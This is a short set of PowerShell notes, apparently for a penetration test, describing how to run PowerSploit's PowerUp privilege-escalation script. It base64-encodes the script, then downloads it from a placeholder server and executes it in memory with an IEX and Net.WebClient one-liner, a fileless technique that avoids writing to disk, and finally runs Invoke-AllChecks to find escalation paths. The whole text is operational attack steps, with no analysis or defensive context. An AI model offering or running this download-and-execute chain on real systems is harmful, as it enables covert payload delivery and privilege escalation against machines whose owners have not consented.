Write-Host "Tester Test"
1. https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
2. encode with base64 on personal machine with command $base64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Content "D:\ad\PowerUp.ps1" -Raw))) $base64 | Out-File "D:\ad\powerup.base64" 
3. If you have in same network with your assessment pc decode and execute the ps1 in memory with command: IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((New-Object Net.WebClient).DownloadString('http://yourserver.com/powerup.base64')))) 
4. If successfully executed use command invoke-allchecks to check possible vuln for priv escalation.
